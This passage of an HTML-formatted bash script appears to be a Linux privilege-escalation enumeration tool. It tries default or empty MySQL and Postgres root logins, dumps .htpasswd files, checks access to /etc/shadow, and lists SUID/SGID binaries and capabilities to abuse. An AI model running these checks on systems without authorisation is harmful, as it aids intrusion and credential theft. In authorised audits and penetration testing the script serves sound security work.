spellcheck="true"># upstart scripts not belonging to root</span>initperms<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> /etc/init \<span class="token operator">!</span> -uid 0 -type f 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">xargs</span> -r <span class="token function">ls</span> -la 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$initperms</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>   <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] /etc/init/ config files not belonging to root:\e[00m\n<span class="token variable">$initperms</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>systemdread<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -lthR /lib/systemd/ 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$systemdread</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] /lib/systemd/* config file permissions:\e[00m\n<span class="token variable">$systemdread</span>"</span>  <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># systemd files not belonging to root</span>systemdperms<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> /lib/systemd/ \<span class="token operator">!</span> -uid 0 -type f 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">xargs</span> -r <span class="token function">ls</span> -la 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$systemdperms</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>   <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] /lib/systemd/* config files not belonging to root:\e[00m\n<span class="token variable">$systemdperms</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token punctuation">}</span>software_configs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m### SOFTWARE #############################################\e[00m"</span> <span class="token comment" spellcheck="true">#sudo version - check to see if there are any known vulnerabilities with this</span>sudover<span class="token operator">=</span>`sudo -V 2<span class="token operator">></span>/dev/null<span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Sudo version"</span> 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$sudover</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Sudo version:\e[00m\n<span class="token variable">$sudover</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#mysql details - if installed</span>mysqlver<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>mysql --version 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$mysqlver</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] MYSQL version:\e[00m\n<span class="token variable">$mysqlver</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#checks to see if root/root will get us a connection</span>mysqlconnect<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>mysqladmin -uroot -proot version 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$mysqlconnect</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] We can connect to the local MYSQL service with default root/root credentials!\e[00m\n<span class="token variable">$mysqlconnect</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#mysql version details</span>mysqlconnectnopass<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>mysqladmin -uroot version 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$mysqlconnectnopass</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] We can connect to the local MYSQL service as 'root' and without a password!\e[00m\n<span class="token variable">$mysqlconnectnopass</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#postgres details - if installed</span>postgver<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>psql -V 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$postgver</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Postgres version:\e[00m\n<span class="token variable">$postgver</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#checks to see if any postgres password exists and connects to DB 'template0' - following commands are a variant on this</span>postcon1<span class="token operator">=</span>`psql -U postgres template0 -c <span class="token string">'select version()'</span> 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> version`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$postcon1</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] We can connect to Postgres DB 'template0' as user 'postgres' with no password!:\e[00m\n<span class="token variable">$postcon1</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>postcon11<span class="token operator">=</span>`psql -U postgres template1 -c <span class="token string">'select version()'</span> 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> version`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$postcon11</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] We can connect to Postgres DB 'template1' as user 'postgres' with no password!:\e[00m\n<span class="token variable">$postcon11</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>postcon2<span class="token operator">=</span>`psql -U pgsql template0 -c <span class="token string">'select version()'</span> 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> version`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$postcon2</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] We can connect to Postgres DB 'template0' as user 'psql' with no password!:\e[00m\n<span class="token variable">$postcon2</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>postcon22<span class="token operator">=</span>`psql -U pgsql template1 -c <span class="token string">'select version()'</span> 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> version`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$postcon22</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] We can connect to Postgres DB 'template1' as user 'psql' with no password!:\e[00m\n<span class="token variable">$postcon22</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#apache details - if installed</span>apachever<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>apache2 -v 2<span class="token operator">></span>/dev/null<span class="token punctuation">;</span> httpd -v 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$apachever</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Apache version:\e[00m\n<span class="token variable">$apachever</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#what account is apache running under</span>apacheusr<span class="token operator">=</span>`grep -i <span class="token string">'user\|group'</span> /etc/apache2/envvars 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{sub(/.*\export /,"")}1'</span> 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$apacheusr</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Apache user configuration:\e[00m\n<span class="token variable">$apacheusr</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$apacheusr</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> --parents <span class="token variable">$format</span>/etc-export/apache2/ 2<span class="token operator">></span>/dev/null  <span class="token function">cp</span> /etc/apache2/envvars <span class="token variable">$format</span>/etc-export/apache2/envvars 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#installed apache modules</span>apachemodules<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>apache2ctl -M 2<span class="token operator">></span>/dev/null<span class="token punctuation">;</span> httpd -M 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$apachemodules</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Installed Apache modules:\e[00m\n<span class="token variable">$apachemodules</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#htpasswd check</span>htpasswd<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -name .htpasswd -print -exec <span class="token function">cat</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$htpasswd</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[-] htpasswd found - could contain passwords:\e[00m\n<span class="token variable">$htpasswd</span>"</span>    <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#anything in the default http home dirs (a thorough only check as output can be large)</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  apachehomedirs<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -alhR /var/www/ 2<span class="token operator">></span>/dev/null<span class="token punctuation">;</span> <span class="token function">ls</span> -alhR /srv/www/htdocs/ 2<span class="token operator">></span>/dev/null<span class="token punctuation">;</span> <span class="token function">ls</span> -alhR /usr/local/www/apache2/data/ 2<span class="token operator">></span>/dev/null<span class="token punctuation">;</span> <span class="token function">ls</span> -alhR /opt/lampp/htdocs/ 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span>  <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$apachehomedirs</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] www home dir contents:\e[00m\n<span class="token variable">$apachehomedirs</span>"</span>     <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token punctuation">}</span>interesting_files<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m### INTERESTING FILES ####################################\e[00m"</span> <span class="token comment" spellcheck="true">#checks to see if various files are installed</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Useful file locations:\e[00m"</span> <span class="token punctuation">;</span> <span class="token function">which</span> nc 2<span class="token operator">></span>/dev/null <span class="token punctuation">;</span> <span class="token function">which</span> netcat 2<span class="token operator">></span>/dev/null <span class="token punctuation">;</span> <span class="token function">which</span> <span class="token function">wget</span> 2<span class="token operator">></span>/dev/null <span class="token punctuation">;</span> <span class="token function">which</span> nmap 2<span class="token operator">></span>/dev/null <span class="token punctuation">;</span> <span class="token function">which</span> gcc 2<span class="token operator">></span>/dev/null<span class="token punctuation">;</span> <span class="token function">which</span> curl 2<span class="token operator">></span>/dev/null <span class="token keyword">echo</span> -e <span class="token string">"\n"</span> <span class="token comment" spellcheck="true">#limited search for installed compilers</span>compiler<span class="token operator">=</span>`dpkg --list 2<span class="token operator">></span>/dev/null<span class="token operator">|</span> <span class="token function">grep</span> compiler <span class="token operator">|</span><span class="token function">grep</span> -v decompiler 2<span class="token operator">></span>/dev/null <span class="token operator">&amp;&amp;</span> yum list installed <span class="token string">'gcc*'</span> 2<span class="token operator">></span>/dev/null<span class="token operator">|</span> <span class="token function">grep</span> gcc 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$compiler</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Installed compilers:\e[00m\n<span class="token variable">$compiler</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#manual check - lists out sensitive files, can we read/modify etc.</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Can we read/write sensitive files:\e[00m"</span> <span class="token punctuation">;</span> <span class="token function">ls</span> -la /etc/passwd 2<span class="token operator">></span>/dev/null <span class="token punctuation">;</span> <span class="token function">ls</span> -la /etc/group 2<span class="token operator">></span>/dev/null <span class="token punctuation">;</span> <span class="token function">ls</span> -la /etc/profile 2<span class="token operator">></span>/dev/null<span class="token punctuation">;</span> <span class="token function">ls</span> -la /etc/shadow 2<span class="token operator">></span>/dev/null <span class="token punctuation">;</span> <span class="token function">ls</span> -la /etc/master.passwd 2<span class="token operator">></span>/dev/null <span class="token keyword">echo</span> -e <span class="token string">"\n"</span> <span class="token comment" spellcheck="true">#search for suid files</span>findsuid<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -perm -4000 -type f -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span><span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$findsuid</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] SUID files:\e[00m\n<span class="token variable">$findsuid</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$findsuid</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/suid-files/ 2<span class="token operator">></span>/dev/null  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$findsuid</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> <span class="token variable">$i</span> <span class="token variable">$format</span>/suid-files/<span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#list of 'interesting' suid files - feel free to make additions</span>intsuid<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -perm -4000 -type f -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> -w $binarylist 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$intsuid</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Possibly interesting SUID files:\e[00m\n<span class="token variable">$intsuid</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#lists word-writable suid files</span>wwsuid<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -perm -4002 -type f -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span><span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$wwsuid</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] World-writable SUID files:\e[00m\n<span class="token variable">$wwsuid</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#lists world-writable suid files owned by root</span>wwsuidrt<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -uid 0 -perm -4002 -type f -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span><span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$wwsuidrt</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] World-writable SUID files owned by root:\e[00m\n<span class="token variable">$wwsuidrt</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#search for sgid files</span>findsgid<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -perm -2000 -type f -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span><span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$findsgid</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] SGID files:\e[00m\n<span class="token variable">$findsgid</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$findsgid</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/sgid-files/ 2<span class="token operator">></span>/dev/null  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$findsgid</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> <span class="token variable">$i</span> <span class="token variable">$format</span>/sgid-files/<span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#list of 'interesting' sgid files</span>intsgid<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -perm -2000 -type f  -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> -w $binarylist 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$intsgid</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Possibly interesting SGID files:\e[00m\n<span class="token variable">$intsgid</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#lists world-writable sgid files</span>wwsgid<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -perm -2002 -type f -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span><span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$wwsgid</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] World-writable SGID files:\e[00m\n<span class="token variable">$wwsgid</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#lists world-writable sgid files owned by root</span>wwsgidrt<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -uid 0 -perm -2002 -type f -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span><span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$wwsgidrt</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] World-writable SGID files owned by root:\e[00m\n<span class="token variable">$wwsgidrt</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#list all files with POSIX capabilities set along with there capabilities</span>fileswithcaps<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>getcap -r / 2<span class="token operator">></span>/dev/null <span class="token operator">||</span> /sbin/getcap -r / 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$fileswithcaps</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[+] Files with POSIX capabilities set:\e[00m\n<span class="token variable">$fileswithcaps</span>"</span>  <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$fileswithcaps</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/files_with_capabilities/ 2<span class="token operator">></span>/dev/null  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$fileswithcaps</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> <span class="token variable">$i</span> <span class="token variable">$format</span>/files_with_capabilities/<span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#searches /etc/security/capability.conf for users associated capapilies</span>userswithcaps<span class="token operator">=</span>`grep -v <span class="token string">'^#\|none\|^$'</span> /etc/security/capability.conf 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$userswithcaps</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Users with specific POSIX capabilities:\e[00m\n<span class="token variable">$userswithcaps</span>"</span>  <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$userswithcaps</span>"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span><span class="token comment" spellcheck="true">#matches the capabilities found associated with users with the current user</span>matchedcaps<span class="token operator">=</span>`echo -e <span class="token string">"<span class="token variable">$userswithcaps</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> \<span class="token variable"><span class="token variable">`</span>whoami\<span class="token variable">`</span></span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$1</span>}'</span> 2<span class="token operator">></span>/dev/null`    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$matchedcaps</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Capabilities associated with the current user:\e[00m\n<span class="token variable">$matchedcaps</span>"</span>        <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>        <span class="token comment" spellcheck="true">#matches the files with capapbilities with capabilities associated with the current user</span>        matchedfiles<span class="token operator">=</span>`echo -e <span class="token string">"<span class="token variable">$matchedcaps</span>"</span> <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token function">read</span> -r cap <span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token keyword">echo</span> -e <span class="token string">"<span class="token variable">$fileswithcaps</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"<span class="token variable">$cap</span>"</span> <span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null`        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$matchedfiles</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>            <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Files with the same capabilities associated with the current user (You may want to try abusing those capabilties):\e[00m\n<span class="token variable">$matchedfiles</span>"</span>            <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>            <span class="token comment" spellcheck="true">#lists the permissions of the files having the same capabilies associated with the current user</span>            matchedfilesperms<span class="token operator">=</span>`echo -e <span class="token string">"<span class="token variable">$matchedfiles</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$1</span>}'</span> <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token function">read</span> -r f<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">ls</span> -la <span class="token variable">$f</span> <span class="token punctuation">;</span><span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null`            <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] Permissions of files with the same capabilities associated with the current user:\e[00m\n<span class="token variable">$matchedfilesperms</span>"</span>            <span class="token keyword">echo</span> -e <span class="token string">"\n"</span>            <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$matchedfilesperms</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>                <span class="token comment" spellcheck="true">#checks if any of the files with same capabilities associated with the current user is writable</span>                writablematchedfiles<span class="token operator">=</span>`echo -e <span class="token string">"<span class="token variable">$matchedfiles</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$1</span>}'</span> <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token function">read</span> -r f<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">find</span> <span class="token variable">$f</span> -writable -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> + <span class="token punctuation">;</span><span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null`                <span class="token keyword">if</span> <span 